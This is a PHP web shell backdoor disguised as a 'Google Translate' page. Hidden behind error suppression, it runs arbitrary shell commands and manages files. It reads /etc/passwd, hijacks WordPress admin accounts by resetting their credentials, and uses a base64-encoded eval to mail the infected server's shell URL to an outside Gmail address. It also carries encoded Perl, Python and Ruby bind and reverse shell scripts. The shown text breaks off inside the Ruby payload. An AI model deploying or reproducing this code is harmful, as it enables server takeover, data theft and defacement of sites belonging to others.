<?php
error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);

function exect($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$exect = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $exect; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$exect = ""; 		
		foreach($results as $result) { 			
			$exect .= $result; 		
		} return $exect; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$exect = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $exect; 	
	} elseif(function_exists('shell_exec')) { 		
		$exect = @shell_exec($cmd); 		
		return $exect; 	
	} 
}


function fperms($filen) {
$perms = fileperms($filen);
$fpermsinfo .= (($perms & 0x0100) ? 'r' : '-');
$fpermsinfo .= (($perms & 0x0080) ? 'w' : '-');
$fpermsinfo .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
$fpermsinfo .= (($perms & 0x0020) ? 'r' : '-');
$fpermsinfo .= (($perms & 0x0010) ? 'w' : '-');
$fpermsinfo .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));
$fpermsinfo .= (($perms & 0x0004) ? 'r' : '-');
$fpermsinfo .= (($perms & 0x0002) ? 'w' : '-');
$fpermsinfo .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
echo '<center><small>'.$fpermsinfo.'</small></center>';
}

?>
<html lang="en-US" xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Google Translate</title>
<link rel="icon" type="image/png" href="https://utilities.cutestat.com/favicon.php?d=translate.google.com"/>
<link href="http://fonts.googleapis.com/css?family=Share+Tech+Mono" rel="stylesheet" type="text/css">
<meta charset="UTF-8">
<meta content="Layanan gratis Google menerjemahkan kata, frasa, dan halaman web secara instan antara bahasa Inggris dan lebih dari 100 bahasa lainnya." name="description">
<meta content="terjemahkan, terjemahan, penerjemah, penterjemah, terjemahan komputer, terjemahan mesin, terjemahan online, terjemahan online" name="keywords">
<meta content="yes" name="apple-mobile-web-app-capable">
<meta content="default" name="apple-mobile-web-app-status-bar-style">
<meta content="telephone=no" name="format-detection">
<meta content="width=device-width,minimum-scale=1.0,maximum-scale=1.0" name="viewport">
</head>
<style type="text/css">
	body {
		font-family: courier;
		background: #f2f2f2;
		font-size: 1px;
	}
	h1 a {
		font-weight: normal;
		font-family: 'Share Tech Mono';
		font-size: 20px;
		color:#006600;
		text-decoration: none;
		margin: 0px;
	}
	h2 {
		font-size: 20px;
		color: #006600;
		text-align: center;
		padding-top: 5px;
		margin: 0;
		margin-top: 10px;
	}
	.menu {
		text-align: center;
		font-size: 12px;
		border-bottom: 1px dashed #006600;
		padding-bottom: 5px;
		margin-bottom: 10px;
	}
	.menu a {
		margin-top: 2px;
		color: #006600;
		text-decoration: none;
		display: inline-block;
	}
	.container {
		font-size: 12px;
	}
	.filemgr {
		font-size: 12px;
		width: 100%
	}
	.filemgr td {
		padding: 3px;
		border-bottom: 1px dashed #006600;
	}
	.filemgr a{
		text-decoration: none;
		color:#006600;
	}
	tr:hover {
		background: #cccccc;
	}
	.tdtl {
		background:#006600;color:#ffffff;text-align:center;font-weight:bold;
	}
	.footer {
		text-align: center;
		border-radius: 30px;
		margin-top: 25px;
		border-top: 1px double #006600;
		padding: 5px;
	}
	.footer a {
		color: #006600;
		text-decoration: none;
	}
	p {
    	word-wrap: break-word;
    	margin:2;
	}
	a {
		text-decoration: none;
		color: #006600;
	}
	.act {
		text-align: center;
	}
	.txarea {
		width:100%;
		height:200px;
		background:transparent;
		border:1px solid #006600;
		padding:1px;color:#006600;
	}
</style>
<?php eval("?>".base64_decode("PD9waHANCiR3ZWIgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogJGluaiA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOw0KICRib2R5ID0gIkFub2FHaG9zdCBuVW5hbWU6ICIucGhwX3VuYW1lKCkuIm5QYXRoIERpcjoNCiIuJGN3ZCA9IGdldGN3ZCgpLiJuTWVzc2FnZTpuIi4ibkUtc2VydmVyOiAiLmh0bWxzcGVjaWFsY2hhcnMNCigkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSkuIm5FLXNlcnZlcjI6ICIuaHRtbHNwZWNpYWxjaGFycyAoJF9TRVJWRVJbIlNFUlZFUl9OQU1FIl0pLiJubklQOiANCiI7DQogbWFpbCgiZHdoeWxpYW1ib0BnbWFpbC5jb20iLCJTaGVsbCBodHRwOi8vJHdlYiRpbmoiLCAiJGJvZHkiKTsNCiAjam1idXQNCj8+")); ?>
<div class="container">
<div style="position:relative;width: 100%;margin-bottom: 5px;border-bottom: 1px dashed #006600;">
	<div style="float: left;width: 15%;text-align: center;border: 1px dashed #006600;margin-bottom: 5px;">
	<h1><a href="?">Exalt Sovereign<br><small>Immemorial Prime</small></a></h1>
	</div>
	<div style="float: right;width: 83%;">
	<?php
		echo php_uname();
		$mysql = (function_exists('mysql_connect')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$curl = (function_exists('curl_version')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$wget = (exect('wget --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$perl = (exect('perl --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$gcc = (exect('gcc --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$python = (exect('python --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$disfunc = @ini_get("disable_functions");
		$show_disf = (!empty($disfunc)) ? "<font color=red>$disfunc</font> <br><i><a href='?bypass=killdiscfunc' style='text-decoration:none;color:lime;text-shadow: 1px 0px 2px black, 1px 0px 2px black, 0px 1px 2px black;font-weight: bold;'>[ KILL THAT DISABLE FUNCTION ]</a></i>" : "<font color=#006600>NONE</font>";
		echo '<br>[ MySQL: '.$mysql.' ][ Curl: '.$curl.' ][ Wget: '.$wget.' ][ Perl: '.$perl.' ][ Compiler: '.$gcc.' ][ Python: '.$python.' ]';
		echo '<p>Disable Function: '.$show_disf;
		echo '<p><a href="?kill=self" style="color:red;text-shadow: 1px 0px 2px black, 1px 0px 2px black, 0px 1px 2px black;font-weight: bold;">[ KILL SELF ]</a></p>';

	?>
	</div>
	<div style="clear: both;" ="clear"></div>
</div>

<?php

if(empty($_GET)) {
	$dir = getcwd();
}
else {
	$dir = $_GET['path'];
}

if(!empty($_GET['path'])) {$offdir = $_GET['path'];}
else if(!empty($_GET['file'])) {$offdir = dirname($_GET['file']);}
else if(!empty($_GET['lastpath'])) {$offdir = $_GET['lastpath'];}
else {$offdir = getcwd();}

?>
<div class="menu">	
<a href="?ext=usersreadblepath&lastpath=<?php echo $offdir;?>">[ Jumping Backup Wordpress ]</a>
<a href="?ext=sql_interface&lastpath=<?php echo $offdir;?>">[ MySQL Interface ]</a>
<a href="?ext=shellcmd&lastpath=<?php echo $offdir;?>">[ Shell Command ]</a>
<a href="?ext=uploader&lastpath=<?php echo $offdir;?>">[ Uploader ]</a>
<a href="?ext=backconnect&lastpath=<?php echo $offdir;?>">[ Backconnect ]</a>
<a href="?ext=mass&lastpath=<?php echo $offdir;?>">[ Mass Deface ]</a>
</div>
<?php
## CURRENT DIR ##

echo '<div style="margin-bottom:10px;">';
echo '<span style="border:1px dashed #009900;padding:2px;">';
$lendir = str_replace("\\","/",$offdir);
$xlendir = explode("/", $lendir);
foreach($xlendir as $c_dir => $cdir) {	
	echo "<a href='?path=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $xlendir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo '</span></div>';
## EOF CURRENT DIR ##

if(!empty($dir)) {
echo '<table class="filemgr">';
echo '<tr><td class="tdtl">Name</td><td class="tdtl" width="9%">Permission</td><td class="tdtl" width="18%">Action</td></tr>'."\n";
$directories = array();
$files_list  = array();
$files = scandir($dir);
foreach($files as $file){
   if(($file != '.') && ($file != '..')){
      if(is_dir($dir.'/'.$file)){
         $directories[] = $file;

      } else{
         $files_list[] = $file;

      }
   }
}

foreach($directories as $directory){
	echo '<tr><td><span class="dbox">[D]</span> <a href="?path='.$dir.'/'.$directory.'">'.$directory.'/</a></td>'."\n";
	echo '<td>';
	fperms($dir.'/'.$directory);
	echo '</td>'."\n";
	echo '<td class="act">';
	echo '<a href="?action=rename&file='.$dir.'/'.$directory.'" class="act">RENAME</a> ';
	echo '<a href="?action=rmdir&file='.$dir.'/'.$directory.'" class="act">DELETE</a>';
	echo '</td>'."\n";
	echo '</tr>'."\n";
}
foreach($files_list as $filename){
	if(preg_match('/(tar.gz)$/', $filename)) {
		echo '<tr><td><span class="dbox">[F]</span> <a href="#" class="act">'.$filename.'</a>'."\n";
		echo ' <a href="?ext=extract2tmp&gzname='.$dir.'/'.$filename.'" style="background:#006600;color:#ffffff;padding:1px;padding-left:5px;padding-right:5px;">EXTRACT TO TMP</a>';
		echo '</td>'."\n";
		echo '<td>';
		fperms($dir.'/'.$filename);
		echo '</td>'."\n";
		echo '<td class="act">';
		echo '<a href="?action=rename&file='.$dir.'/'.$filename.'" class="act">RENAME</a> ';
		echo '<a href="?action=delete&file='.$dir.'/'.$filename.'" class="act">DELETE</a> ';
		echo '<a href="?action=download&file='.$dir.'/'.$filename.'" class="act">DOWNLOAD</a>';
		echo '</td>'."\n";
		echo '</tr>'."\n";
	} 
	else {
		echo '<tr><td><span class="dbox">[F]</span> <a href="?action=view&file='.$dir.'/'.$filename.'" class="act">'.$filename.'</a></td>'."\n";
		echo '<td>';
		fperms($dir.'/'.$filename);
		echo '</td>'."\n";
		echo '<td class="act">';
		echo '<a href="?action=edit&file='.$dir.'/'.$filename.'" class="act">EDIT</a> ';
		echo '<a href="?action=rename&file='.$dir.'/'.$filename.'" class="act">RENAME</a> ';
		echo '<a href="?action=delete&file='.$dir.'/'.$filename.'" class="act">DELETE</a> ';
		echo '<a href="?action=download&file='.$dir.'/'.$filename.'" class="act">DOWNLOAD</a>';
		echo '</td>'."\n";
		echo '</tr>'."\n";
	}
}
echo '</table>';
}


if($_GET['action'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=#006600>Successed!</font>";
		} else {
			$act = "<font color=red>Permission Denied!</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=#006600>".basename($_GET['file'])."</font>";
	echo "<form method='post'>
	<textarea name='src' class='txarea'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 20%;background:#006600;border:none;color:#f2f2f2;margin-top:5px;height:30px;'>
	</form>";
}
else if($_GET['action'] == 'view') {
	echo "Filename: <font color=#006600>".basename($_GET['file'])."</font>";
	echo "<textarea class='txarea' style='height:400px;' readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
}
else if($_GET['action'] == 'rename') {
	$path = $offdir;
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$path/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<font color=#006600>Successed!</font>";
		} else {
			$act = "<font color=red>Permission Denied!</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=#006600>".basename($_GET['file'])."</font>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
}
else if($_GET['action'] == 'delete') {
	$path = $offdir;
	$delete = unlink($_GET['file']);
	if($delete) {
		
	} else {
		$act = "<font color=red>Permission Denied!</font>";
	}
	echo $act;
} else if($_GET['action'] == 'rmdir') {
	$path = $offdir;
	$delete = rmdir($_GET['file']);
	if($delete) {
		echo '<font color=#006600>Deleted!</font><br>';
	} else {
		echo "\n<font color=#006600>Try Force Delete!</font>\n<br>";
		exect('rm -rf '.$_GET['file']);
		if(file_exists($_GET['file'])) {
			echo '<font color=red>Permission Denied!</font>';
		} else
		{
			echo '<font color=#006600>Deleted!</font>';
		}
	}

} else if($_GET['action'] == 'download') {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.$file.'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}

if($_GET['ext'] == 'usersreadblepath') {
	echo '<h2>.::[ Jumping From Backup Wordpress ]::.</h2>';
		$i = 0;
		echo "<pre><div class='margin: 5px auto;'>";
		$etc = fopen("/etc/passwd", "r");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<center><font color=red>Can't read /etc/passwd</font></center>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user);
				foreach($user[1] as $users) {
					$user_dir = "/home/$users/usersreadblepath";
					if(is_readable($user_dir)) {
						$i++;
						$jrw = "[R] <a href='?path=$user_dir'>/home/$users/usersreadblepath</a>";
						if(is_writable($user_dir)) {
							$jrw = "[RW] <a href='?path=$user_dir'>/home/$users/usersreadblepath</a>";
						}
						echo $jrw."\n";

					}
				}
			}
		}
		if($i == 0) { 
			echo '<center><font color=red>usersreadblepath is null in this host!</font></center>';
		} else {
			echo "<br>Total ".$i." Users in ".gethostbyname($_SERVER['HTTP_HOST'])."";
		}
		echo "</div></pre>";
}

### EXTRACTOR TO TMP ###
else if($_GET['ext'] == 'extract2tmp')
{
	if (file_exists($_SERVER["DOCUMENT_ROOT"].'/tmp/') && is_writable($_SERVER["DOCUMENT_ROOT"].'/tmp/')) {
    	$tmppath = $_SERVER["DOCUMENT_ROOT"].'/tmp/';
	}
	else if(file_exists(dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/') && is_writable(dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/')) {
		$tmppath = dirname($_SERVER["DOCUMENT_ROOT"]).'/tmp/';
	}
	else if(file_exists('/tmp/') && is_writable('/tmp/')) {
		$tmppath = '/tmp/';
	}
	else {
		$tmppath = '';
	}

	if(!empty($tmppath)) {
		$gzfile = $_GET['gzname'];
		echo '[FILE] '.$gzfile.'<br>';
		echo '-- extract to --<br>';
		echo '[TMP] '.$tmppath.'<br>';
		$bsname = basename($gzfile);
		$gzrname = explode(".", $bsname);
		echo '<form method="post" action="">';
		echo '<input name="extract" type="submit" value="EXTRACT">';
		echo '</form>';
			if(!empty($_POST['extract'])) {
				exect('mkdir '.$tmppath.$gzrname[0]);
				$destdir = $tmppath.$gzrname[0];
				if (file_exists($destdir) && is_writable($destdir)) {
					echo "\n".'[EXTRACTED] <a href="?path='.$destdir.'">'.$destdir.'</a>'."\n";
					exect('tar -xzvf '.$gzfile.' -C '.$destdir);
				}
				else
				{
					echo 'FAILED!';
				}
			}
	}
	else {
		echo 'CANNOT EXTRACT TO TMP!';
	}

} 
### EXTRACTOR TO TMP - EOF ###

### CMD ###
else if($_GET['ext'] == 'shellcmd')
{
	echo '<h2>.::[ Shell Command ]::.</h2>';
	echo '<form method="post" action="">';
	echo 'terminal:~$ <input name="cmd" type="text" placeholder="echo valeiriya" style="width:300px"/>';
	echo ' <input type="submit" value=">>"/>';
	echo '</form>';
	if(!empty($_POST['cmd'])) {
		echo '<textarea style="width:100%;height:150px;" readonly>';
			$cmd = $_POST['cmd'];
			echo exect($cmd);
		echo '</textarea>';
	}
}
### CMD EOF ###

### UPLOADER ###
else if($_GET['ext'] == 'uploader')
{
	echo '<h2>.::[ Uploader ]::.</h2>';
	echo '<center>';
	echo '<form method=post enctype=multipart/form-data>';
	echo '<br><br>PATH ['.$offdir.']<br>';
	echo '<input type="file" name="zerofile"><input name="postupl" type="submit" value="Upload"><br>';
	echo '</form>';
	if($_POST["postupl"] == 'Upload')
	{
		if(@copy($_FILES["zerofile"]["tmp_name"],"$offdir/".$_FILES["zerofile"]["name"]))
			{ echo '<b>OK! '."$offdir/".$_FILES["zerofile"]["name"].'</b>'; }
		else 
			{ echo '<b>Upload Failed.</b>'; }
	}
	echo '</center>';
}
### UPLOADER EOF ###

### MYSQL INTERFACE ###
else if($_GET['ext'] == 'sql_interface')
{
	echo '<h2>.::[ MySQL Interface ]::.</h2>';
	echo '<center>';
	$dwadminer = 'https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php';
	$fileadminer = 'z-adminer.php';
	function call_adminer($dwadminer, $fileadminer) {
		$fp = fopen($fileadminer, "w+");
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $dwadminer);
		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	file_put_contents($dwadminer, $fileadminer);
	}
	echo '<form method=post enctype=multipart/form-data>';
	echo '<input name="mysql_int" type="submit" value="Call Adminer 4.3.1"><br>';
	echo '</form>';
	if($_POST['mysql_int'] == 'Call Adminer 4.3.1') {
	    call_adminer($dwadminer, $fileadminer);
	    $linkz = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
	    if(file_exists('z-adminer.php')) {
	    	echo '<a href="'.$linkz.dirname($_SERVER['PHP_SELF']).'/'.$fileadminer.'" target="_blank">Adminer OK!</a>';
	    }
	    else {
	    	echo '<font color="red">[FAILED]</a>';
	    } 

	}
	echo '</center>';
}
### MYSQL INTERFACE EOF ###


### TAMBAHAN usersreadblepath BASH ###
if($_GET['grab'] == 'wp_options') {
	$userdb = $_POST['wpuser'];
	$passdb = $_POST['wppass'];
	$namedb = $_POST['wpdb'];
	$hostdb = $_POST['wphost'];
	echo 'WP_OPTIONS';
	if(!empty($userdb)) {
	$link = mysql_connect($hostdb, $userdb, $passdb);
	if (!$link) {die('Could not connect: ' . mysql_error());}
	if (!mysql_select_db($namedb)) {die('Could not select database: ' . mysql_error());}
	//
	$tblz = mysql_query("SELECT table_name FROM information_schema.tables WHERE table_schema='".$namedb."' AND table_name LIKE '%_options' LIMIT 1");
	if (!$tblz) {die('Could not query:' . mysql_error());}
	$tbl = mysql_result($tblz, 0, 'table_name'); // outputs third employee's name
	$result = mysql_query("SELECT option_value FROM ".$tbl." WHERE option_name = 'siteurl' AND option_id = '1'");
	if (!$result) {die('Tbl Could not query:' . mysql_error());}
	echo "\n".'[DOMAIN] '.mysql_result($result, 0, 'option_value')."\n"; // outputs third employee's name
	mysql_close($link);
	}
} else if($_GET['grab'] == 'wp_users_updt') {
	$userdb = $_POST['wpuser'];
	$passdb = $_POST['wppass'];
	$namedb = $_POST['wpdb'];
	$hostdb = $_POST['wphost'];
	$prefix = $_POST['tpfx'];
	echo 'WP_USERS';
		$conn = new mysqli($hostdb, $userdb, $passdb, $namedb);
		if ($conn->connect_error) {
		    die("Connection failed: " . $conn->connect_error);
		} 
		$sql = "UPDATE ".$prefix."users SET user_login = 'tenshi', user_pass = MD5('anoaghost96') WHERE user_status = '0' LIMIT 1";
		if ($conn->query($sql) === TRUE) {
		    echo "Record updated successfully";
		} else {
		    echo "Error updating record: " . $conn->error;
		}
		$conn->close();
}
### TAMBAHAN usersreadblepath BASH EOF ###

### backconnect ###
else if($_GET['ext'] == 'backconnect')
{
	echo "<br><br><center><form method=post>
<br>	<span>Bind port to /bin/sh [Perl]</span><br/>
	Port: <input type='text' name='port' value='443'> <input type=submit name=bpl value='press'>
<br><br>
	<span>Back-connect</span><br/>
	Server: <input type='text' name='server' placeholder='". $_SERVER['REMOTE_ADDR'] ."'> 
	Port: <input type='text' name='port' placeholder='443'>
	<select class='select' name='backconnect'  style='width: 100px;' height='10'>
	<option value='perl'>Perl</option>
	<option value='python'>Python</option>
	<option value='ruby'>Ruby</option>
	</select>
   <input type=submit value='press'>";
	if($_POST['bpl']) {
	$bp=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
	$brt=@fopen('bp.pl','w');
fwrite($brt,$bp);
$out = exe("perl bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>$out\n".exe("ps aux | grep bp.pl")."</pre>";
unlink("bp.pl");
		}
		if($_POST['backconnect'] == 'perl') {
$bc=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
$plbc=@fopen('bc.pl','w');
fwrite($plbc,$bc);
$out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>$out\n".exe("ps aux | grep bc.pl")."</pre>";
unlink("bc.pl");
}
if($_POST['backconnect'] == 'python') {
$becaa=base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBDb243ZXh0IC0gWGFpIFN5bmRpY2F0ZVxuVGhhbmtzIEdvb2dsZSBGb3IgUmVmZXJlbnNpXG5cbicnJykNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwwKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDEpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMikNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwzKQ0KICAgIHNoZWxsID0gc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pDQogIGV4Y2VwdCBzb2NrZXQudGltZW91dDoNCiAgICBwcmludCAiVGltT3V0Ig0KICBleGNlcHQgc29ja2V0LmVycm9yLCBlOg0KICAgIHByaW50ICJFcnJvciIsIGUNCnB5YmFja2Nvbm5lY3QoKQ==");
$pbcaa=@fopen('bcpyt.py','w');
fwrite($pbcaa,$becaa);
$out1 = exe("python bcpyt.py ".$_POST['server']." ".$_POST['port']);
sleep(1);
echo "<pre>$out1\n".exe("ps aux | grep bcpyt.py")."</pre>";
unlink("bcpyt.py");
}
if($_POST['backconnect'] == 'ruby') {
$becaak=base64_decode("IyEvdXNyL2Jpbi9lbnYgcnVieQ0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KIw0KIyBiaW5kIGFuZCByZXZlcnNlIHNoZWxsDQojIGIzNzRrDQpyZXF1aXJlICdzb2NrZXQnDQpyZXF1aXJlICdwYXRobmFtZScNCg0KZGVmIHVzYWdlDQoJcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KCXByaW50ICJyZXZlcnNlIDpcclxuICBydWJ5ICIgKyBGaWxlLmJhc2VuYW1lKF9fRklMRV9fKSArICIgW3BvcnRdIFtob3N0XVxyXG4iDQplbmQNCg0KZGVmIHN1Y2tzDQoJc3Vja3MgPSBmYWxzZQ0KCWlmIFJVQllfUExBVEZPUk0uZG93bmNhc2UubWF0Y2goJ21zd2lufHdpbnxtaW5ndycpDQoJCXN1Y2tzID0gdHJ1ZQ0KCWVuZA0KCXJldHVybiBzdWNrcw0KZW5kDQoNCmRlZiByZWFscGF0aChzdHIpDQoJcmVhbCA9IHN0cg0KCWlmIEZpbGUuZXhpc3RzPyhzdHIpDQoJCWQgPSBQYXRobmFtZS5uZXcoc3RyKQ0KCQlyZWFsID0gZC5yZWFscGF0aC50b19zDQoJZW5kDQoJaWYgc3Vja3MNCgkJcmVhbCA9IHJlYWwuZ3N1YigvXC8vLCJcXCIpDQoJZW5kDQoJcmV0dXJuIHJlYWwNCmVuZA0KDQppZiBBUkdWLmxlbmd0aCA9PSAxDQoJaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KCQlwb3J0ID0gSW50ZWdlcihBUkdWWzBdKQ0KCWVsc2UNCgkJdXNhZ2UNCgkJcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCgkJZXhpdA0KCWVuZA0KCXNlcnZlciA9IFRDUFNlcnZlci5uZXcoIiIsIHBvcnQpDQoJcyA9IHNlcnZlci5hY2NlcHQNCglwb3J0ID0gcy5wZWVyYWRkclsxXQ0KCW5hbWUgPSBzLnBlZXJhZGRyWzJdDQoJcy5wcmludCAiKioqIGNvbm5lY3RlZFxyXG4iDQoJcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQoJYmVnaW4NCgkJaWYgbm90IHN1Y2tzDQoJCQlmID0gcy50b19pDQoJCQlleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCgkJZWxzZQ0KCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQl3aGlsZSBsaW5lID0gcy5nZXRzDQoJCQkJcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyPyQvDQoJCQkJaWYgbm90IGxpbmUuY2hvbXAgPT0gIiINCgkJCQkJaWYgbGluZSA9fiAvY2QgLiovaQ0KCQkJCQkJbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KCQkJCQkJaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQoJCQkJCQkJbGluZSA9IHJlYWxwYXRoKGxpbmUpDQoJCQkJCQkJRGlyLmNoZGlyKGxpbmUpDQoJCQkJCQllbmQNCgkJCQkJCXMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KCQkJCQllbHNpZiBsaW5lID1+IC9cdzouKi9pDQoJCQkJCQlpZiBGaWxlLmRpcmVjdG9yeT8obGluZS5jaG9tcCkNCgkJCQkJCQlEaXIuY2hkaXIobGluZS5jaG9tcCkNCgkJCQkJCWVuZA0KCQkJCQkJcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQoJCQkJCWVsc2UNCgkJCQkJCUlPLnBvcGVuKGxpbmUsInIiKXt8aW98cy5wcmludCBpby5yZWFkICsgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+In0NCgkJCQkJZW5kDQoJCQkJZW5kD